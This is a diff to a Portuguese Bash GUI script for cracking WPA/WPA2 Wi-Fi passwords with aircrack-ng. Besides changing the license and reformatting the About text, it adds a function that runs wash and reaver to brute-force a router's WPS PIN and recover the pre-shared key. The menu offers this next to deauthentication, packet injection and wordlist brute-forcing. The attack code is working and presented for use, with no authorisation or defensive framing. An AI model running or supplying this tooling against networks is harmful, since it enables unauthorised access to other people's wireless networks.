@@ -4,7 +4,7 @@ TITLE="King Size Cracking WPA/WPA2"
 DATE=$(date +'%d-%m-%Y-%H-%M')	
 AUTHOR="Joao Lucas <joaolucas@linuxmail.org>"
 VERSION="0.1"
-LICENSE="GPL"
+LICENSE="MIT License"
 OUTPUT="Capturas"
 INTERFACE="wlp1s0"
 INTERFACE_MON="wlp1s0mon"
@@ -54,11 +54,21 @@ function_verificar_dependencias(){
 	then
 		echo "[ FALHA ] xfce4-terminal nao instalado!"
 		exit 1	
+	fi
+
+	if ! hash reaver 2> /dev/null
+	then
+		echo "[ FALHA ] reaver nao instalado!"
+		exit 1
 	fi	
 }
 
 function_about(){
-	yad --text="$TITLE \nversao $VERSION \n\nCracking WPA/WPA2 utilizando suite aircrack-ng e yad dialog \n\nSoftware sob a licenca GNU GPL versao 3 \nCodigo fonte disponivel no Github \n<https://github.com/joao-lucas/kingsizecracking> \n\nAuthor: $AUTHOR" \
+		yad --text="$TITLE \nversao $VERSION \n\n \
+	Cracking WPA/WPA2 utilizando suite aircrack-ng e yad dialog \n\n \
+	Software sob a licenca MIT License \nCodigo fonte disponivel no Github \n \
+	<https://github.com/joao-lucas/kingsizecracking> \n\n \
+	Author: $AUTHOR" \
 		--text-align=center \
                 --image gtk-about \
                 --no-markup \
@@ -166,7 +176,17 @@ function_injetar(){
         --buttons-layout="center"
 } 
 
-function_quebrar(){
+function_testar_pin(){
+
+	#verificar os AP com que estao utilizando WPS
+	wash -i $INTERFACE_MON
+
+ 	# O ataque consiste em capturarmos o PIN code para depois obtermos a senha
+	reaver -i $INTERFACE_MON -b $BSSID -c $CHANNEL -vv
+
+}
+
+function_quebrar_psk(){
 	if [ ! -e $WORDLIST ]; then
 	      	yad --text="Voce deve setar uma Wordlist!" \
 		--text-align=center \
@@ -217,7 +237,8 @@ function_menu(){
 			find "Escanear uma rede" "Escanear apenas uma rede especifica" \
 			gtk-execute "Deauth" "Fazer desautenticacao dos hosts no AP" \
 			gtk-execute "Injetar" "Injetar pacotes no AP" \
-			gtk-execute "Quebrar" "Tentar quebrar a senha com forca bruta" \
+			gtk-execute "Testar PIN" "[WPS] Realizar brute force sobre o codigo PIN do roteador para depois obter a PSK" \
+			gtk-execute "Quebrar PSK" "Realizar brute force para tentar quebrar a senha Pre-Shared Key" \
 			gtk-about "Sobre" "Informacoes sobre o script" \
 			gtk-quit "Sair" "Sair do script")
 
@@ -230,7 +251,8 @@ function_menu(){
 		"Escanear uma rede") function_escanear_uma_rede ;;
 		"Deauth") function_deauth ;;
 		"Injetar") function_injetar ;;
-		"Quebrar") function_quebrar ;; 
+		"Testar PIN") function_testar_pin ;;
+		"Quebrar PSK") function_quebrar_psk ;; 
 		"Sobre") function_about ;;
 		"Sair") function_encerrar_todos_processos; exit 0 ;;
 	esac
